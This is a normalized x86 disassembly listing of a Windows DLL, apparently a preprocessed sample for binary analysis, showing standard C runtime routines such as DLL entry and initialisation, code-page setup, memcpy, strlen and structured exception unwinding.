cmp eax 0x3
jne r-xdata
call sub_1001bf16
push 0x214
push 0x1
call sub_10019e40
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_1001de20
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1001dd89
mov [ rw-data ] eax
call sub_1001d7c0
test eax eax
jns r-xdata
call sub_1001b912
jmp r-xdata
call sub_1001deb5
retn 0xc
xor eax eax
inc eax
push edi
call sub_1001c1fd
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1001d793
call sub_1001dcce
test eax eax
js r-xdata
call sub_1001bf4a
jmp r-xdata
push esi
call sub_1001750d
pop ecx
jmp r-xdata
push edi
push esi
call sub_1001bf87
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017c53
jmp r-xdata
call sub_1001da05
call sub_1001bf4a
call sub_1001b912
call sub_1001da05
jmp r-xdata
call sub_1001da58
test eax eax
js r-xdata
push 0x0
call sub_1001d5a6
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10017cde
push 0xc
push r--data
call sub_1001de70
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001050
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10017b7a
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10017b7a
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001050
push edi
push 0x0
push ebx
call sub_10017b7a
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1001deb5
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_10017cde
pop ecx
pop ebp
retn 0xc
call sub_1001e1c9
sub_10017df7
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10017e43
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10017eab
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10017e98
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10017e43
pop ecx
mov esi eax
call sub_10017e85
mov [ eax ] esi
pop esi
pop ebp
retn
sub_10017ece
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_10019dfb
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_10019e40
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_10019e40
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_10019e40
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_10019e40
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1001e38b
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_1001750d
push [ ebp - 0x1c ]
call sub_1001750d
push [ ebp - 0x20 ]
call sub_1001750d
push [ ebp - 0x28 ]
call sub_1001750d
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_1001750d
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_1001e34b
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_1001a10a
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_1001a10a
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_100183c0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_100183c0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_100183c0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1001750d
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1001750d
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1001750d
push [ esi + 0xc0 ]
call sub_1001750d
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10018330
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100183c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10018444 ]
jmp [ ecx * 4 + jump_table_100184c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018530 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_100186cc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_100185d0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100186cc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10018530 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100186cc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018530 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018530 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018530 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100186cc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100186cc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100186cc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10018721
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1001875a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_100187ae
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001ae51
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_100187e4
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10016ec3
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001ae51
add esp 0x20
pop esi
pop ebp
retn
sub_10018817
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_100188ee
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1001c0b4
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_100188ee
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10016ec3
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001ae51
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_10018817
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001875a
pop ebx
leave
retn
sub_1001898d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1001e7a0
call sub_1001e7a0
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_10018a00
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1001c0b4
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1001c0b4
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_10018a2c
mov edi edi
push ebp
mov ebp esp
call sub_1001c0b4
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_10018a53
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001c0b4
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1001c0b4
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1001c0b4
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1001e7a0
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_10018aa5
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_100187e4
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1001e7f0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_10018b05
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10018b38
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10018b82
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_1001e83c
mov esi [ eax ]
call sub_1001e83c
cmp esi [ eax ]
jl r-xdata
call sub_1001e842
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_10018baa
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_1001c03b
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
